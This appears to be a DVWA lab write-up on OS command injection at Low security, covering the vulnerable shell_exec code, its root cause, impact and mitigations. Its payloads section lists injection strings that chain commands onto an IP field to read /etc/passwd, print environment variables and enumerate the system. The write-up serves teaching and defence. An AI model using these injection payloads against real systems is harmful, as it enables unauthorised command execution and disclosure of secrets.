# OS Command Injection — Low Security

## Overview

- **Security Level:** Low
- **Vulnerability Type:** OS Command Injection
- **Application:** Damn Vulnerable Web Application (DVWA)

## Description

OS Command Injection occurs when an application incorporates user-controlled input into an operating system command, allowing an attacker to alter the command's execution.

In DVWA's Low security level, user input is directly concatenated into a shell command without effective filtering, making command injection straightforward to demonstrate.

## Source Code Analysis

The application retrieves the submitted IP address from the request:

```php
$target = $_REQUEST['ip'];
```

It then concatenates the input into a command and executes it using `shell_exec()`:

```php
$cmd = shell_exec('ping -c 4 ' . $target);
```

The Windows branch uses a different `ping` syntax but follows the same approach.

### Root Cause

The application passes user-controlled input directly into a shell command without safe argument handling. Shell metacharacters can therefore change how the command is interpreted and executed.

### Key Observation

Unlike the Medium security level, the Low level does not implement a blacklist to remove selected shell operators.

## Payloads

The following payloads demonstrate command execution and information gathering in a local DVWA lab.

### 1. Command Chaining

```bash
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; hostname
127.0.0.1; pwd
```

**Concept:** The `;` operator separates commands. The following command can execute regardless of the previous command's exit status.

### 2. Conditional Execution

```bash
127.0.0.1 && whoami
127.0.0.1 && id
127.0.0.1 || whoami
```

**Concept:**

- `&&` executes the next command only if the previous command succeeds.
- `||` executes the next command only if the previous command fails.

The actual behavior depends on the exit status returned by the preceding command.

### 3. Shell Behavior Testing

```bash
127.0.0.1; echo INJECTION_TEST
127.0.0.1 && echo SUCCESS
127.0.0.1 || echo FAILURE
```

These payloads help demonstrate command chaining and conditional execution. The displayed messages alone do not establish whether the original command succeeded or failed; their execution depends on the shell conditions.

### 4. System Enumeration

```bash
127.0.0.1; uname -a
127.0.0.1; cat /etc/hostname
127.0.0.1; cat /etc/os-release
127.0.0.1; cat /proc/version
```

- `uname -a`: Displays system and kernel information.
- `/etc/hostname`: Contains the configured hostname.
- `/etc/os-release`: Identifies the operating system and distribution.
- `/proc/version`: Provides information about the running kernel.

### 5. File and Environment Information Disclosure

```bash
127.0.0.1; ls -la
127.0.0.1; ls -la /var/www/html
127.0.0.1; cat /etc/passwd
127.0.0.1; printenv
```

- `ls -la`: Lists files and directories, including hidden entries.
- `ls -la /var/www/html`: Inspects a common web root path if it exists and is accessible.
- `/etc/passwd`: Displays local account entries and account metadata.
- `printenv`: Displays environment variables that may contain configuration details or sensitive information.

**Note:** Results depend on the operating system, available commands, filesystem permissions, and the privileges of the web server process. Do not publish real secrets or sensitive environment output in a public repository.

## Impact

Successful exploitation may allow an attacker to:

- Execute arbitrary OS commands with the privileges of the web server process.
- Retrieve system, account, and environment information.
- Read or modify files accessible to the application process.
- Potentially compromise the server, depending on the execution context and permissions.

## Mitigation

- Avoid invoking OS commands when equivalent language or framework APIs are available.
- If command execution is necessary, use APIs that pass arguments separately rather than constructing shell command strings.
- Validate input using a strict allowlist appropriate to the expected data.
- Run the application with least-privilege permissions.

Input filtering alone is not a reliable defense against OS Command Injection.
